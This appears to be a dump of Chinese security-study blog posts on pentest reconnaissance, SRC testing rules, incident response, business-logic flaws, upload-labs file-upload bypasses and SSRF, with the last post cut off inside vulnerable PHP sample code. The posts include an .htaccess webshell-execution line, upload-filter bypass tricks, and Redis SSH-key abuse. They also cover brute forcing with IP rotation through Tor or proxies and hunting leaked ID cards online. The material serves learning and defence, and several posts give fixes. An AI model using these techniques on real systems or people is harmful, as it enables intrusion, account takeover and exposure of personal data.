JavaScript功能信息收集JavaScript信息收集主要是看看某些功能是不是前端js校验，如图所示，如果是前端校验的我们可以通过禁用js或者直接使用burpsuit进行更改数据包进行相关绕过。另外还可以去资源模块（Resource）看看有没有可利用的js文件，比如conf.js，里面可能会涉及到一些暗藏的链接等敏感信息。 危害： 1.如果上传点是前端校验的，那么我们可以禁用js来进行webshell的上传 2.有时在登录页面你可以禁用js之后，然后使用任意账户密码登录即可成功进入到系统中 所以开发者做相关校验的时候，切记在前端的一切校验都是不安全的，尽量前端（客户端）和后端（服务器端）一起校验和过滤！ burp被动收集Burp1、scope爬虫（site map） 2、Burp插件收集 ​ request数据包内容 ​ response数据包内容 主动爬虫Crawlergo动态爬虫 注册资料收集（注册时需提供资质）1、能言论自由的地方，比如搜索身份证信息 2、github 搜索开发者网站域名 3、百度网盘搜索证件照，营业执照，手持等关键词 信息收集系统 开源资产收集系统w12scan xunfeng（不太好用） 字典定制厂商专属字典 前期信息收集，确认厂商员工账号命名规则，定制精准用户字典（注册，密码找回策略，github，邮件服务器，搜索引擎） 1、工具：passmaker https://github.com/bit4woo/passmaker 2、服务器24小时爆破 3、突破IP限制 1、代理池 2、aws api 3、aws 提供的IP服务，通过该服务器可切换自己的出口ip 4、tor网络:https://github.com/realgam3/pymultitor 前端加密1、前端sign ​ 按键精灵 2、AES加密 验证码绕过验证码在回包中 验证码设计缺陷 ，不改cookie 不刷新 图形验证码识别 次时代验证码识别系统2.3 滑块验证码：selenium.webdriver 参考链接：https://github.com/Qftm/Information_Collection_Handbook https://mp.weixin.qq.com/s/Y0PPqyHysBPmgmDw2KmHYw F12信息收集word文档]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透测试之规范学习]]></title>
    <url>%2F2020%2F03%2F08%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[SRC行业安全测试规范​ 公告编号：CNSRC-2019-0115 日期：2019-11-08 12:06:21 参与此标准制定的组织：菜鸟SRC、蚂蚁金服SRC、ASRC、阿里云先知、本地生活SRC、同舟共测-企业安全响应联盟、腾讯SRC、百度SRC、360SRC、小米SRC、滴滴SRC、苏宁SRC、唯品会SRC、微博SRC、美丽联合SRC、网易SRC、VIPKIDSRC、vivoSRC、WiFi万能钥匙SRC、完美世界SRC、爱奇艺SRC 学习目标：相关安全法规（统一规范，知道利弊，小心进去），总结学习安全相关法律法规的心得，在挖 SRC 漏洞之前要先阅读其发布的安全规范，以免踩坑。 一、测试规范: 注入漏洞，只要证明可以读取数据就行，严禁读取表内数据。对于UPDATE、DELETE、INSERT 等注入类型，不允许使用自动化工具进行测试。 越权漏洞，越权读取的时候，能读取到的真实数据不超过5组，严禁进行批量读取。 帐号可注册的情况下，只允许用自己的2个帐号验证漏洞效果，不要涉及线上正常用户的帐号，越权增删改，请使用自己测帐号进行。帐号不可注册的情况下，如果获取到该系统的账密并验证成功，如需进一步安全测试，请咨询管理员得到同意后进行测试。 存储xss漏洞，正确的方法是插入不影响他人的测试payload，严禁弹窗，推荐使用console.log，再通过自己的另一个帐号进行验证，提供截图证明。对于盲打类xss，仅允许外带domain信息。所有xss测试，测试之后需删除插入数据，如不能删除，请在漏洞报告中备注插入点。 如果可以shell或者命令执行的，推荐上传一个文本证明，如纯文本的1.php、1.jsp等证明问题存在即可，禁止下载和读取服务器上任何源代码文件和敏感文件，不要执行删除、写入命令，如果是上传的webshell，请写明shell文件地址和连接口令。 在测试未限制发送短信或邮件次数等扫号类漏洞，测试成功的数量不超过50个。如果用户可以感知，例如会给用户发送登陆提醒短信，则不允许对他人真实手机号进行测试。 如需要进行具有自动传播和扩散能力漏洞的测试（如社交蠕虫的测试），只允许使用和其他账号隔离的小号进行测试。不要使用有社交关系的账号，防止蠕虫扩散。 禁止对网站后台和部分私密项目使用扫描器。 除特别获准的情况下，严禁与漏洞无关的社工，严禁进行内网渗透。 禁止进行可能引起业务异常运行的测试，例如：IIS的拒绝服务等可导致拒绝服务的漏洞测试以及DDOS攻击。 请不要对未授权厂商、未分配给自己的项目、超出测试范围的列表进行漏洞挖掘，可与管理员联系确认是否属于资产范围后进行挖掘，否则未授权的法律风险将由漏洞挖掘者自己承担。 禁止拖库、随意大量增删改他人信息，禁止可对服务稳定性造成影响的扫描、使用将漏洞进行黑灰产行为等恶意行为。 敏感信息的泄漏会对用户、厂商及上报者都产生较大风险，禁止保存和传播和业务相关的敏感数据，包括但不限于业务服务器以及Github 等平台泄露的源代码、运营数据、用户资料等，若存在不知情的下载行为，需及时说明和删除。 尊重《中华人民共和国网络安全法》的相关规定。禁止一切以漏洞测试为借口，利用安全漏洞进行破坏、损害用户利益的行为，包括但不限于威胁、恐吓SRC要公开漏洞或数据，请不要在任何情况下泄露漏洞测试过程中所获知的任何信息，漏洞信息对第三方披露请先联系SRC获得授权。企业将对违法违规者保留采取进一步法律行动的权利。 二、学习心得:在挖 SRC 漏洞之前要先阅读其发布的安全规范，以免踩坑。在可以使用sqlmap执行查询动作的工具，只要对数据无影响，不得查询超过5组的数据，不得影响正常业务，对用户使用产生影响，xss插入测试之后需要删除测试数据，短信炸弹最多发送不超过50条，禁止社工，内网渗透，DDOS攻击，超出范围的测试。 参考链接：https://sec.cainiao.com/announce_conment.htm?id=115]]></content>
  </entry>
  <entry>
    <title><![CDATA[应急响应工具包]]></title>
    <url>%2F2020%2F02%2F25%2F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7%E5%8C%85%2F</url>
    <content type="text"><![CDATA[目标：1、掌握 Windows、Linux 系统及常见站点下快速收集信息（系统、用户、进程、安全日志等）及安全隐患排查的方法与技巧； 2、熟练使用火融剑/Process Explorer、Wireshark、rootkit 等进程、流量分析及木马查杀工具； 3、熟知各种常见的勒索病毒、木马查杀、在线样本分析站点； 4、将自己常用的应急响应工具整理成一个镜像包，并将相关工具的使用心得整理成文档。 扩展学习：系统安全漏洞排查（SQL注入、命令执行）、流量中对文件进行还原、虚拟机下对恶意程序进行动态分析。 信息收集基础信息收集windows 主机1.查看系统版本 (Windows NT是一系列操作系统的总称)ver 按下Windows 键+ R 键，打开【运行】对话框，输入【winver】，确定 2.查看 SP 版本wmic os get ServicePackMajorVersion (service packet (sp) 服务补丁包（一系列补丁的集合）) 3.查看 Hotfix （wmic qfe 查看补丁安装情况）hotfix—-热补丁针对单一漏洞的补丁 wmic qfe get hotfixid,InstalledOn 4.查看主机名hostname 5.查看网络配置ipconfig /all 6.查看路由表route print 7.查看开放端口netstat -ano 8.查看开启的服务net start 9.主机信息systeminfo 扩展 查看开放端口3389端口号对应的进程，最右边的数字就是进程号。netstat -ano | find “:3389” 2. tasklist -V | find “1276” 查找pid号1276的进程名称(-v 显示的更详细) 可以看出，是 xxx.exe 这个进程占用了端口号，这时可以使用 Windows 任务管理器将服务停掉。 3. taskkill /PID 17284 /T /F 强行终止一个进程 错误：权限无法访问解决方法：右击cmd,用管理员身份运行 taskkill /PID 1276 /T /F linux 主机1. 查看系统内核版本的两种方法 2. 3.lsb_release -a，即可列出所有版本信息 4.查看本地监听的tcp端口netstat -lnt 主机进程查看Windowstasklist命令1.查看本机进程 2.查看系统进程提供的服务 3 查看调用DLL模块文件的进程列表 tasklist /m 4.使用筛选器查找指定的进程 TASKLIST /FI “USERNAME ne NT AUTHORITY\SYSTEM” /FI “STATUS eq running” 列出了系统中正在运行的非“SYSTEM“状态的所有进程。其中“/FI“为筛选器参数。 Tasklist /FI “PID eq xxxx”，使用筛选器查找指定的PID 扩展1.windows 登录可使用 cmd 开启任务管理器： taskmgr 2.应急时如果是 windows xp 或 windows 7，任务管理器点“查看”－》“选择列” ，一般至少勾选“PID”和“映象路径”，可以选择多个列辅助应急。 Linux主机ps -aux 或 ps -ef1.显示所有包含其他使用者的进程,使用grep对进程进行筛选 ps -aux或者ps -ef 进程工具Windows: IceSword， wsyscheck， powertooWindows进程与端口对应情况1.使用 netstat –ano 命令得到端口对应的 PID，使用 Tasklist /FI “PID eq xxxx”命令得到 PID 对应的进程名称。 2.使用netstat -anb，可以直接查看进程与端口的对应情况 Linux进程与端口对应情况1.使用netstat -anp命令，可以查看端口对应的进程信息 2.使用lsof -i命令，可以查看实时的进程，服务与端口信息 常见的应用程序配置文件 wireshark流量中对文件进行还原应急响应工具使用windows进程分析工具ProcessHacker功能：ProcessHacker是一款不错的进程分析工具，可查看所有进程信息，包括进程加载的dll、进程打开的文件、进程读写的注册表……，也可以将特定进程的内存空间Dump到本地，此外还可以查看网络连接。 ProcessExplorer功能：ProcessExplorer是一款不错的进程分析工具，微软官方推荐工具，稳定性和兼容性相对不错。可查看所有进程的信息，包括其加载的dll、创建的线程、网络连接……，同样可以Dump出进程的内存空间到本地。 ProcessMonitor功能：ProcessMonitor是一款实时刷新的进程信息监控工具，微软官方推荐工具，稳定性和兼容性也是相对出色。展示的信息很全面，且每一个打开的句柄、注册表、网络连接……都与具体的进程关联起来。 windows启动项分析工具功能：一款不错的启动项分析工具，微软官方推荐。只要涉及到启动项相关的信息，事无巨细，通通都可以查询得到，非常方便找到病毒的启动项。 信息收集工具BrowsingHistoryView功能：收集浏览器的历史记录，方便追溯域名、URL的访问来源是否源自于用户行为。 WEB shell查杀工具 D盾 功能：D盾是迪元素科技的一款Webshell查杀工具。 相关学习网站勒索病毒(https://www.nomoreransom.org/)、木马查杀、在线样本分析站点信息查询网站勒索病毒信息查询网站：https://www.botfrei.de/de/ransomware/galerie.html 勒索病毒信息查询网站：https://id-ransomware.malwarehunterteam.com/ 解密工具卡巴斯基勒索病毒解密工具集：https://noransom.kaspersky.com/ Avast勒索软件解密工具集：https://www.avast.com/zh-cn/ransomware-decryption-tools Trendmicro勒索软件解密工具集：http://support.asiainfo-sec.com/Anti-Virus/Clean-Tool/Tools/RansomwareFileDecryptor/ nomoreransom勒索软件解密工具集：https://www.nomoreransom.org/zh/decryption-tools.html Emsisoft勒索软件解密工具集：https://www.emsisoft.com/decrypter/ 清除勒索软件以及下载免费解密工具。由卡巴斯基实验室发布。 https://noransom.kaspersky.com/zh/ 学习网站https://www.secpulse.com/archives/category/articles/system https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=32&amp;filter=typeid&amp;typeid=62&amp;orderby=dateline 2.1 病毒分析PCHunter：http://www.xuetr.com 火绒剑：https://www.huorong.cn Process Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhacker：https://processhacker.sourceforge.io/downloads.php autoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTL：https://www.bleepingcomputer.com/download/otl/ SysInspector：http://download.eset.com.cn/download/detail/?product=sysinspector 2.2 病毒查杀卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe （推荐理由：绿色版、最新病毒库） 大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库） 火绒安全软件：https://www.huorong.cn 360杀毒：http://sd.360.cn/download_center.html 2.3 病毒动态CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn 微步在线威胁情报社区：https://x.threatbook.cn 火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html 爱毒霸社区：http://bbs.duba.net 腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html 2.4 在线病毒扫描网站http://www.virscan.org //多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎 https://habo.qq.com //腾讯哈勃分析系统 https://virusscan.jotti.org //Jotti恶意软件扫描系统 http://www.scanvir.com //针对计算机病毒、手机病毒、可疑文件等进行检测分析 2.5 webshell查杀D盾_Web查杀：http://www.d99net.net/index.asp 河马webshell查杀：http://www.shellpub.com 深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html Safe3：http://www.uusec.com/webshell.zip 参考链接https://www.twblogs.net/a/5d0096fcbd9eee14029fbf7d/zh-cn https://www.freebuf.com/articles/es/206199.html 应急响应实战笔记-Bypass]]></content>
  </entry>
  <entry>
    <title><![CDATA[应急响应基础]]></title>
    <url>%2F2020%2F02%2F24%2F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[目标1、掌握应急响应的概念及常规的响应场景； 2、了解 PDCERF 流程，每个阶段要做的具体事情并绘制出流程图； 3、熟悉应急响应中常见的安全事件分类； 4、将学习心得与绘制的流程图整理成文档。 扩展学习：企业应急事件分类、安全事件溯源分析的方法、卡巴斯基的应急响应指南。 基本概念安全事件（Security Accident） 是指影响一个系统正常工作的情况。这里的系统包括主机和网络，如黑客入侵、信息窃取、拒绝服务攻击、网络流量异常等 应急响应（Emergency Response） 是指组织为了应对突发/重大信息安全事件的发生所做的准备以及在事件发生后所采取的措施。 常规的应急响应场景（分类）网络攻击事件 安全扫描攻击：利用扫描器对目标进行扫描探测，发现漏洞后进一步利用漏洞进行攻击。 暴力破解攻击：对目标系统账号密码进行暴力破解，获得后台管理员权限。 系统漏洞攻击：操作系统，应用系统中存在的漏洞进行攻击。 WEB漏洞攻击：通过SQL注入，上传，XSS，授权绕过等WEB漏洞进行攻击。 拒绝服务攻击：通过大流量DDOS或者CC攻击目标，使服务器无法提供正常服务； 其他网络攻击行为。 恶意程序事件： 病毒，蠕虫，造成系统缓慢，数据损坏，运行异常； 远控木马： 主机被黑客远程控制； 僵尸网络程序（肉鸡行为）：主机对外发动DDOS攻击，对外发起扫描攻击行为； 挖矿程序 ：造成系统资源大量消耗； WEB恶意代码 Webshell后门：黑客通过Webshell控制主机； 网页挂马：页面被植入待病毒内容，影响访问者安全； 网页暗链：网站被植入博彩，游戏等广告内容。 信息破坏事件 系统配置遭篡改：系统中出现异常服务，进程，启动项，账号等等； 数据库内容篡改：业务数据遭到恶意篡改，引发业务异常和损失； 网站内容篡改：网站页面内容被黑客恶意篡改； 信息数据泄露事件：服务器数据，会员账号遭到窃取并泄露； 其他安全事件 账号被异常登录：系统账号在异地登录，可能出现账号密码泄露； 异常网络连接：服务器发起对外的异常访问，连接到木马主控端，矿池，病毒服务器等行为； 应急响应PDCERF 模型 P：指preparation准备，之前要做的各种工具，如编译好的Ls，ifconfig,ps这些事先准备好的。 D：指Detection诊断，诊断初期发生了哪些类型的问题，该环节强化了信息取证和预先通告，以助于后续工作的开展，利于同样是大规模流量，L4DDos和CC，蠕虫爆发，应对的应急手段不一样。 C:指Containment抑制，容易被忽视，首先应抑制受害范围，隔离区域，切断受害面扩大范围，再追求根治。思路同ITIL。 E：指Eradication根除，寻找根因，封堵攻击源。 R: 指Reconvery恢复，恢复业务，增加必要的安全加固措施，这步是大多说人熟悉的一步。 F：指follow-up跟踪，后续监控有无异常，报告，管理环节的自省和改进，现在一般称为安全运营的持续改进环节。 具体要做的事情如下: 准备阶段 该阶段以预防为主。 （1）制定应急响应工作流程文档计划，建立一组基于威胁态势的合理防御措施。 （2）制定预警与报警的方式流程，建立搞笑事件处理程序； （3）建立备份的体系和流程，按网络安全政策配置安全设备和软件； （4）一个支持事件响应活动的基础设施，获取处理问题的资源和人员，进行安全培训，预演应急事件； 事件监测与分析阶段a.紧急事件监测，如何检测？： 防火墙日志 系统日志 Web服务器日志 IDS日志 可疑的用户 管理员报告 b.初始响应： 初步判定事件类型，定义事件级别，预估事件的范围和影响严重程度（涉及到多少网络，多少主机等）以此决定启动相应的应急响应方案； 准备相关资源； 为紧急事件的处理取得管理方面的支持（决定是否关闭被破坏系统的业务，是否继续收集入侵者活动数据）； 组件事件处理小组； 制定安全事件响应策略； c.事件分级： 决定什么对自己最重要 为紧急事件确定优先级，更有效的利用资源 不是紧急事件都需要平等对待； d.响应后的事件调查 事件起因分析 事件取证追查 系统后门调查，漏洞分析 数据收集，数据分析； 抑制处理阶段在检测到安全事件后，抑制的目的在于限制攻击范围，限制潜在的损失与破坏，在限制被抑制后，找出事件根源并彻底解决；然后就该着手恢复系统，把所有受侵害的系统，应用数据库恢复到他们的正常业务状态。 收集入侵相关的所有资料，收集并保护证据，保证安全地获取并且保存证据； 确定使系统恢复正常的需求和时间表、从可信的备份介质中恢复用户数据和应用服务； 通过对有关恶意代码或行为的分析结果，找出事件根源明确相应的补救措施并彻底清除，并对攻击源进行准确定位并采取措施将其中断； 清理系统、恢复数据、程序、服务，把所有被攻破的系统和网络设备彻底还原到正常的任务状态。 应急响应基本流程 应急响应的目标· 防止散乱和无协作的响应 · 根据法律和政策保护隐私 · 确认或排除事件是否发生 · 进行快速检查和现场封锁 · 将事件的破坏性减到最小 · 提供报告和有价值的建议 · 改进策略防止类似事件发生 参考文档https://www.jianshu.com/p/e49f0319044c]]></content>
  </entry>
  <entry>
    <title><![CDATA[业务逻辑漏洞]]></title>
    <url>%2F2019%2F12%2F22%2F%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[常规漏洞： 1、编码阶段产生，开发新手容易产生 2、相对易发现 3、容易防护，相对难利用 业务逻辑漏洞: 1、设计阶段产生 2、相对难发现 3、难以防护，相对易利用 相同点：信息泄露，资金损失 逻辑漏洞产生的原因： 1、第三方逻辑缺陷 2、开发水平对安全认识程度 3、没有在设计初期进行安全审计 电商业务为例的业务场景： 1、注册 2、登录 3、提交订单 4、购买支付 5、抽奖活动 6、个人信息相关 7、代金券/优惠券 8、找回密码 业务逻辑未授权1、site：aaa.com 2、域名爆破 3、端口及banner(redis、运维后台) 4、域名关联（whois查询） 登录与账户图形验证码：1、失效 2、空密码登录 短信验证码：1、循环使用 2、无数次限制 账号登录回显与注册明文密码登录账号及其他个人信息篡改密码重置1、忘记密码 2、重置时使用现有密码 越权前、后台订单遍历 商家资质信息遍历 取消订单 恶意刷评 支付金额篡改 充值、体现 数量、商品/优惠id篡改 API参数校验不完善（三个参数填写一个即可） 短信、邮箱轰炸 关键参数不加密（订单、商家资质id） 支付逻辑漏洞场景总结列举p1.抓包直接改价格 。 p2.请求链接里面改价格 。 p3.改商品数量如充值会员-2年、正负值对冲。 p4.有的金额不能改但能改运费金额。 p5.构造请求链接后面加订单号，直接访问该链接就能下单。 p6.请求重放，多次下单。 p7.参数污染 请求没该参数，却返回该参数，可请求该参数污染返回值。 p等其它姿势… 支付逻辑漏洞修复建议之多重校验流程图 支付逻辑漏洞修复建议总结p1.和银行交易时，做数据签名，对用户金额和订单签名 p2.敏感参数不要明文放在URL中 p3.服务端效验客户端提交的参数 p4.在服务端计算金额的时候，一定要判断是否为正数。 p5.支付过程中加一个服务器生成的key，用户校验参数有没有被串改。 p6.如果一定需要用URL传递相关参数，建议进行后端的签名验证 p7.订单金额和充值接口返回的数据进行校验。 p8.提交订单时后台判断单价是否与数据库中相符，如不符则返回错误。 p9.支付时应从服务器拉取数据，而不是直接读客户端的值！！ 越权漏洞修复建议之身份认证流程图 越权漏洞修复建议总结1、采用成熟的权限管理框架，如spring security。 2、用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）优先采用在服务端关联 ​ session或加密后放在session中的方式获取。 3、必须采用表单或其他参数提交用户进行访问操作的凭证（如用户ID、产品号码、订单流水号 ​ 等）时，应尽可能采用难以猜测的构造方式（增加字母及随机数字等）或采用复杂的加密算法 ​ 加密后提交，应对客户端提交的凭证与会话的权限进行严格的验证，如提交的产品号码是否为 ​ 隶属于登录用户的产品号码。 4、对管理功能模块进行严格的权限验证，如非必要建议不对互联网开放或进行网络层的访问控 ​ 制 未授权访问1、某网站未授权访问泄露重要信息 2、未授权访问之redis、MongoDB等.. predis未授权访问产生的原因： redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他 非信任来源ip访问等相关安全策略，直接暴露在公网；没有设置密码认证（一般为空），可以免密码远程登录redis服务。 p p漏洞的危害： p1.攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据； p2.攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件； p3.最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器 ​ 修复建议： 1、默认只对本地开放 bind 127.0.0.1 2、添加登陆密码 3、在需要对外开放的时候修改默认端口 更多未授权访问漏洞MongoDB、Hadoop、CouchDB等参考：https://www.secpulse.com/archives/61101.html 密码重置漏洞场景总结列举p1.密码修改页面可以预测。 p2.验证码可以爆破 。 p3.密码重置验证码接收帐号由客户端决定。 p4.修改返回包绕过验证码找回密码。 p5.重置密码新的密码出现在返回数据包中。 p6.密码重置验证码出现在返回数据包中。 p7.密码重置验证码多人公用 自己的验证码修改别人的密码。 p8.测试A输入验证码到输入新密码页面，然后B点击发送验证码，在A页面继续操作，实际改的是B的密码。 p9.利用自己邮箱/手机号码，获取到正确验证码。然后输入正确验证码，用户名改变，然后去掉检测用户名的参数，就可以跳到重置密码页面，而且重置别人的。 p10.获取验证码是通过验证码实例化获取，如何从其他地方获取到验证码，然后用这验证码去重置密码，也是可行的。例如，登录处获取到验证码，然后得到的验证码用到重置密码处，就成功通过验证了。 p等其它姿势… 密码重置漏洞修复建议总结p1.减少验证码有效时间 p2 使用后即销毁 p3 增加验证码复杂程序 p4 限制该功能单个ip提交频率 p5 对重要参数加入验证码同步信息或时间戳； p6 重置密码后，新密码不应返回在数据包中。 p7 接收验证码的帐号由服务端提供，不能信任客户端提交的数据 p8 服务端校验短信验证码后应通过 cookie 记录状态，不应在前端通过状态参数判断。另外，服务端应限制枚举等恶意请求。 p9 密码重置链接中 token 尽可能随机化，若用常规加密算法，一定用客户端无法查看且猜测的因子作为盐值。另外，服务端应限制枚举等恶意请求。]]></content>
  </entry>
  <entry>
    <title><![CDATA[文件上传]]></title>
    <url>%2F2019%2F12%2F18%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2F</url>
    <content type="text"><![CDATA[什么是文件上传？文件上传功能允许用户将本地的文件通过Web页面提交到网站服务器上，但是如果不对用户的上传进行合法性验证，则攻击者可利用Web应用系统文件上传功能（如文件上传、图像上传等）的代码缺陷来上传任意文件或者Webshell，并在服务器上运行，以达到获取Web应用系统控制权限或其他目的。 从upload-labs学习文件上传 # 上传流程检测1、客户端javascript检测2、服务端MIME类型检测3、服务端目录路径检测4、服务端文件扩展名检测5、服务端文件内容检测客户端检测绕过：1.上传页面，审查元素，修改页面JS代码：删除检测后缀名的函数 2.上传图片马，配置Burp Suite代理进行抓包，然后再将文件名12.png改为12.php 服务端检测绕过：检查Content-Type （内容类型）图片木马或者修改MIME类型 检查后缀 （检查后缀是主流）检查文件头图片马 检查文件后缀名绕过方法： 1.黑名单不全绕过，如php5、pht、phtml等 2.大小写绕过 3.系统特型，如windows：php+space、php. 4..htaccess 5.Apache解析漏洞 6.%00截断 文件后缀名检测之白名单绕过0x00截断绕过 nginx解析漏洞 文件包含 注： 了解%00实际上我们要先了解0x00，0x00实际上是一个十六进制表示方式，实际上就是表示ascii码值为0，有些函数在处理这个字符的时候会把这个字符当做结束符，他们就读取到这里认为这一段结束了 在文件上传时，如果遇到了白名单机制只允许上传jpg后缀的，在没有解析漏洞的情况下我们该怎么办？ JPG格式并不会被解析，那么我们需要绕过上传过滤。 假如我写了1.php%00.jpg 传参之后，有些过滤都是直接匹配字符串，他强行匹配到了结尾是.jpg，然后允许上传，但是php的函数去执行的时候他读取到0x00认为结束了，那么这个文件就变成了1.php 实验Pass-01前端使用js，过滤上传文件后缀名上传，开启burp抓包发现没有截断相关与服务器建立请求，即证明前端校验 文件名为1.gif文件正常上传 此处判断为前端校验 上传方法： 将php文件，修改后缀为白名单中的后缀，然后上传绕过，bp截取数据包，修改回来为php，即可绕过前端校验 上传到服务器路径 Pass-02服务端对数据包的MIME进行检查 媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。它在IETF RFC 6838中进行了定义和标准化。 修改MIME类型后，成功上传 Pass-03禁止上传.asp|.aspx|.php|.jsp后缀文件 绕过：既然不允许上传php后缀，那么上传其他不在黑名单内的后缀的文件即可。 php、php5、php4、php3、php2、html、htm、phtml、pht 可以绕过长传，是否解析是否解析需要根据配置文件中设置类型来决定 Pass-04禁止上传黑名单后缀文件，漏禁.htaccess 绕过： 所有可解析执行的文件的后缀拓展名都在黑名单中了。但漏禁.htaccess了，可通过.htaccess机制进行绕过。 介绍： 1、.htaccess文件是Apache服务器中的一个==配置文件==，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 2、.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 绕过： 利用.htaccess配置文件机制，上传一个.htaccess配置文件，内容为： SetHandler application/x-httpd-php 作用是将所有文件都解析为php，从而达到执行的目的。 图片木马制作： 准备工作： PHP文件内容 验证： Pass-06禁止上传黑名单后缀文件，加入了.htaccess， 但是没有将后缀进行大小写统一，于是可以通过大小写绕过： Pass-07还是黑名单，但是没有对后缀名进行去空处理，可在后缀名中加空绕过： Pass-08还是黑名单，但是没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过： Pass-09还是黑名单，但是没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过 PASS-10绕过： 路径拼接的是处理后的文件名，处理机制是去点去特征字符串去空。那么在目标文件后添加点添加空，然后配合处理机制处理后，即可绕过 PASS-11绕过：路径拼接的是处理后的文件名，处理机制是将存在问题的后缀替换为空。双写即可绕过。 白名单 %00截断的条件： （1）php版本必须小于5.3.4（2）php的配置文件php-ini中，magic_quotes_gpc设置为Off PASS-14 通过读文件的前2个字节判断文件类型，因此直接上传图片马即可 利用工具进行FUZZ很多网站对上传进行拦截的时候采取的是黑名单校验，当我们看到黑名单的时候就可以考虑采取修改后缀、截断等方式尝试绕过。 我们采用一个工具：https://github.com/c0ny1/upload-fuzz-dic-builder 来生成fuzz的字典。执行命令: 缺点： 会在服务器上产生大量的垃圾文件 防范措施防范任意文件上传漏洞需要遵循以下原则文件 文件类型验证​ 检验上传文件的后缀名，设定允许上传文件类型白名单；​ 检查文件头信息，判断文件类型；​ 限制文件大小；​ 在服务端进行安全检查，避免利用客户端传入的信息作为检查依据。 存储路径安全​ 避免允许用户设定或选择存储路径和保存的文件名，严格检测提交数据中是否含有中断符；​ 上传文件和新建目录；​ 上传文件尽可能的重命名，如果不能做到这一点，应该保证上传的文件名不包括特殊字符，新建的目录应该保证目录名不包含特殊字符。 严格分配文件访问权限策略​ 使用最严格的访问权限策略来保护上传或新建的文件和目录。以下是一段实例代码：设置白名单，并阻止路径遍历的敏感字符。判断上传类型是否合法（只允许扩展名为gif|jpg|jpeg|png|bmp的文件）： 参考链接：https://rj45mp.github.io/%E4%BB%8Eupload-labs%E5%AD%A6%E4%B9%A0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/ https://mp.weixin.qq.com/s/hPyy1Z7SP6DpF5vdpoPaGQ https://misakikata.github.io/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/ https://xz.aliyun.com/t/2435 https://misakikata.github.io/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/]]></content>
  </entry>
  <entry>
    <title><![CDATA[SSRF相关]]></title>
    <url>%2F2019%2F12%2F17%2FSSRF%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[什么是SSRF?SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 形成原因漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 易产生SSRF的地方 分享：通过url地址分享网页内容 通过url地址加载或者下载图片 从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed） 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB） 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML） Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP） 其他调用url或者类似出现==站内站==的情况，能够对外发起网络请求的地方，就可能存在 SSRF 漏洞 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。 根据远程 URL 上传，静态资源图片等，这些会请求远程服务器的资源。 数据库的比如 mongodb 的 copyDatabase 函数。 邮件系统就是接收邮件服务器地址这些地方。 文件就找 ImageMagick，xml 这些。 从 URL 关键字中寻找，比如：source,share,link,src,imageurl,target 等。 php后端实现1、file_get_contents 12345678910&lt;?phpif (isset($_POST[&apos;url&apos;])) &#123; $content = file_get_contents($_POST[&apos;url&apos;]); $filename =&apos;./images/&apos;.rand().&apos;;img1.jpg&apos;; file_put_contents($filename, $content); echo $_POST[&apos;url&apos;]; $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; &#125;echo $img;?&gt; 这段代码使用 file_get_contents 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。 2、fsockopen() 1234567891011121314151617181920&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) 